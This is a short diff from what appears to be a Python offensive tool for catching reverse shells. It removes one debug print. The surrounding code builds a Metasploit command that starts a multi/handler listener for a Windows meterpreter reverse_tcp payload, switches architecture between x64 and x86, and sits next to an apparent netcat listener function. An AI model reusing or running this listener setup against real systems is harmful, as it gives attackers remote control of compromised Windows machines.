@@ -41,7 +41,6 @@ def nc_list(port = args.port, payload = payload):
 def msf_list(IP = Get_IP(), PORT = args.port):
     print(blue('Setting up your listener on metasploit.\n'))
     print(green('Waiting to say I\'m in...\n'))
-    print(arch)
     command = 'msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp;set LHOST ' + IP + ';set LPORT ' + PORT + '; exploit" 2>/dev/null'
     if arch == 'x86' or arch == '86':
         command = command.replace('x64', 'x86')
